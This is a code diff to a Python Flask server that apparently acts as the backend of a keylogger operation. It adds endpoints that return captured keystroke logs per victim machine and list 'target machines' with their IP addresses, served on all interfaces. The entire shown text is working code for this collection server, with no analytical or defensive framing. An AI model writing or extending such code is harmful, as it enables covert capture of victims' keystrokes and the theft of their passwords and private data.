@@ -95,5 +95,47 @@ def get_demo():
     return jsonify(data), 200
 
 
+@app.route('/api/get_keystrokes', methods=['GET'])
+def get_keystrokes():
+    machine_sn = request.args.get('machine_sn')
+
+    if not machine_sn:
+        return jsonify({"error": "invalid machine serial number"}), 400
+
+    try:
+        with open('data.json', 'r', encoding='utf-8') as f:
+            data = json.load(f)
+        if machine_sn not in data:
+            return jsonify({"error": "machine not exist"}), 404
+    except FileNotFoundError:
+        return jsonify({"error": "file not found"}), 500
+
+    machine_path = data[machine_sn]['path']
+    try:
+        with open(machine_path + '/log.json', 'r', encoding='utf-8') as f:
+            machine_log = json.load(f)
+
+    except Exception as e:
+        return jsonify({"error": "logs not found"}), 404
+
+    return jsonify({"keylogs": machine_log}), 200
+
+@app.route('/api/get_target_machines_list', methods=['GET'])
+def get_target_machines_list():
+    try:
+        with open('data.json', 'r', encoding='utf-8') as f:
+            data = json.load(f)
+            machines = {sn: machine_data['ip'] for sn, machine_data in data.items()}
+    except Exception as e:
+        machines = {}
+
+    try:
+        return jsonify(machines), 200
+    except Exception as e:
+        return jsonify({"error": "server error"}), 500
+
+
+
+
 if __name__ == "__main__":
     app.run(port=9734, host='0.0.0.0')
